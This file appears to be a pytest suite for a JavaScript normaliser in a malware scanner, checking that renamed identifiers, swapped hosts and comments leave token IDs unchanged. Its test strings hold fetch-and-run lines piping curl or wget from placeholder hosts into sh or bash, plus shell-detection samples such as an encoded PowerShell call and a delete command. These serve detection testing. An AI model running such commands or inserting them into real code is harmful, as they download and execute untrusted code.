"""The role normaliser (notes/59-role-normaliser.md with its review changes): edits a campaign makes to
a file -- renamed identifiers, other hosts and strings of the same class, comments -- leave its
normalised tokens unchanged; a different program does not share them."""

from __future__ import annotations

from typing import ClassVar

import pytest

from cordon_scanner.analysis.javascript.code_model import CodeFeatures
from cordon_scanner.analysis.javascript.role_normaliser import RoleNormaliser


class RoleKit:
    @staticmethod
    def ids(text: str) -> list[int]:
        return RoleNormaliser.ids(text.encode())

    @staticmethod
    def tokens(text: str) -> list[str]:
        return RoleNormaliser.tokens(text.encode())


class TestEditsThatChangeNothing:
    BASE = (
        "const cp = require('child_process');\n"
        "function run(cmd, done) { const out = cp.execSync(cmd); done(out); }\n"
        "run('curl https://a.example/x | sh', (r) => console.log(r));\n"
    )

    def test_renamed_identifiers_give_equal_ids(self) -> None:
        renamed = self.BASE.replace("cp", "q9").replace("run", "go").replace("cmd", "c")
        renamed = renamed.replace("done", "cb").replace("out", "o").replace("(r)", "(z)")
        renamed = renamed.replace("log(r)", "log(z)")
        assert RoleKit.ids(renamed) == RoleKit.ids(self.BASE)

    def test_another_host_and_command_of_the_same_class_give_equal_ids(self) -> None:
        other = self.BASE.replace(
            "curl https://a.example/x | sh", "wget http://b.example/y -O- | bash"
        )
        assert RoleKit.ids(other) == RoleKit.ids(self.BASE)

    def test_a_url_and_a_path_in_the_same_place_differ(self) -> None:
        assert RoleKit.ids("f('https://a.example/x');") != RoleKit.ids("f('/etc/x');")

    def test_comments_and_blanks_change_nothing(self) -> None:
        commented = "// a note\n" + self.BASE.replace(";\n", ";   /* x */\n\n")
        assert RoleKit.ids(commented) == RoleKit.ids(self.BASE)


class TestRoles:
    def test_a_platform_property_is_kept_and_another_is_prop(self) -> None:
        assert RoleKit.tokens("x.exec(a);")[:3] == ["FREE", ".", "exec"]
        assert RoleKit.tokens("x.foo(a);")[:3] == ["FREE", ".", "PROP"]

    def test_a_required_module_binds_import_and_its_name_is_kept(self) -> None:
        out = RoleKit.tokens("const cp = require('child_process'); cp.spawn('x');")
        assert out[:6] == ["const", "IMPORT", "=", "require", "(", "S:child_process"]
        assert out[out.index(";") + 1] == "IMPORT"

    def test_parameters_and_locals(self) -> None:
        out = RoleKit.tokens(
            "function f(a, b) { let c = a; } const g = (d) => d; const h = e => e;"
        )
        assert out == [
            "function", "LOCAL", "(", "PARAM", ",", "PARAM", ")", "{", "let", "LOCAL", "=", "PARAM",
            ";", "}", "const", "LOCAL", "=", "(", "PARAM", ")", "=>", "PARAM", ";", "const", "LOCAL",
            "=", "PARAM", "=>", "PARAM", ";",
        ]  # fmt: skip

    def test_a_role_is_the_nearest_earlier_bindings(self) -> None:
        # Review change 1: a local renamed to an imported name's spelling changes only its own uses.
        before = "const cp = require('child_process');\ncp.exec('a');\nfunction f() { let x = 1; return x; }\n"
        after = before.replace("let x = 1; return x;", "let cp = 1; return cp;")
        b, a = RoleKit.tokens(before), RoleKit.tokens(after)
        cut = b.index("function")
        assert a[:cut] == b[:cut]
        assert a[cut:] == b[cut:]  # LOCAL either way: the binding decides, not the spelling

    def test_a_use_before_any_binding_is_free(self) -> None:
        assert RoleKit.tokens("y = 1;")[0] == "FREE"


class TestComputedMembers:
    @pytest.mark.parametrize("form", ["x['exec'](a);", 'x["exec"](a);', "x?.exec(a);"])
    def test_read_as_the_dotted_form(self, form: str) -> None:
        assert RoleKit.ids(form) == RoleKit.ids("x.exec(a);")


class TestShellStrings:
    @pytest.mark.parametrize(
        "text",
        [
            "curl x | sh",
            "powershell -enc AAAA",
            "cmd /c del x",
            "chmod +x a && ./a",
            "echo hi > /dev/null",
        ],
    )
    def test_a_command_line_is_shell(self, text: str) -> None:
        assert RoleNormaliser._literal(text) == "S:SHELL"

    @pytest.mark.parametrize("text", ["a | b", "<b>x</b>", "x > y", "hello world"])
    def test_prose_and_markup_are_not(self, text: str) -> None:
        assert RoleNormaliser._literal(text) != "S:SHELL"


class TestTheVocabulary:
    def test_it_is_closed_and_its_ids_do_not_collide(self) -> None:
        vocabulary = RoleNormaliser.vocabulary()
        ids = {RoleNormaliser.token_id(t) for t in vocabulary}
        assert len(ids) == len(set(vocabulary))

    def test_every_token_produced_is_in_it(self) -> None:
        text = (
            "import fs from 'fs'; const s = `a${fs.readFileSync('/x')}b`; s.match(/x+/g);"
            " let été = 0x1f ?? 2; label: for (;;) { break label; } a >>>= 1;"
        )
        assert set(RoleKit.tokens(text)) <= set(RoleNormaliser.vocabulary())

    def test_the_hash_moves_with_a_kept_list(self, monkeypatch: pytest.MonkeyPatch) -> None:
        before = RoleNormaliser.vocabulary_hash()
        monkeypatch.setattr(CodeFeatures, "PLATFORM", CodeFeatures.PLATFORM | {"newApi"})
        assert RoleNormaliser.vocabulary_hash() != before


class TestBounds:
    COUNTS: ClassVar[list[int]] = []

    def test_cut_at_the_token_cap(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.setattr(RoleNormaliser, "MAX_TOKENS", 10)
        assert len(RoleKit.tokens("a; " * 100)) == 10

    @pytest.mark.parametrize("copies", [100, 1000])
    def test_linear_in_tokens(self, copies: int, monkeypatch: pytest.MonkeyPatch) -> None:
        # Step count, never wall time: one name decision per name token.
        calls = 0
        original = RoleNormaliser._name.__func__

        def counted(cls, toks, i, bound, params):
            nonlocal calls
            calls += 1
            return original(cls, toks, i, bound, params)

        monkeypatch.setattr(RoleNormaliser, "_name", classmethod(counted))
        RoleKit.tokens("x = y; " * copies)
        assert calls == 2 * copies
